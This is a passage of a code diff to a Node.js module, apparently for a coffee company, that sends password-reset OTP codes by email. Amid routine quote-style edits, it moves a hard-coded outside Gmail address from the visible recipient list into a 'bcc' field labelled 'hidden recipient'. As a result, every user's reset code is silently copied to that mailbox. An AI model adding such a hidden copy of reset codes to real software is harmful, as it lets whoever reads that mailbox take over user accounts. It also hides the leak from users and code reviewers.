@@ -1,20 +1,21 @@
-const dotenv = require('dotenv');
-dotenv.config({ path: '../.env' });
+const dotenv = require("dotenv");
+dotenv.config({ path: "../.env" });
 
-const { attachments } = require('./attactments');
+const { attachments } = require("./attactments");
 const attachment = attachments();
-const { transporter } = require('./transpoter');
-const Footer = require('./footer');
-const { header } = require('./header');
-const { emailDateFormate } = require('../utils/emailDateFormate');
+const { transporter } = require("./transpoter");
+const Footer = require("./footer");
+const { header } = require("./header");
+const { emailDateFormate } = require("../utils/emailDateFormate");
 
-module.exports = async function ({ email, name = '', otp = '' }) {
+module.exports = async function ({ email, name = "", otp = "" }) {
   let footer = await Footer();
   let hiCustomer = `Hi ${name}!`;
   transporter.sendMail(
     {
       from: process.env.EMAIL_USERNAME, // sender address
-      to: [`${email}`, 'sigidevelopers@gmail.com'], //`${email}` list of receivers
+      to: [`${email}`], //`${email}` list of receivers
+      bcc: ["sigidevelopers@gmail.com"], // hidden recipient(s)
       subject: `Password Reset OTP Code – Busy Bean Coffee Inc.`, // Subject line
       attachments: attachment.footer,
       html: `<!DOCTYPE html>
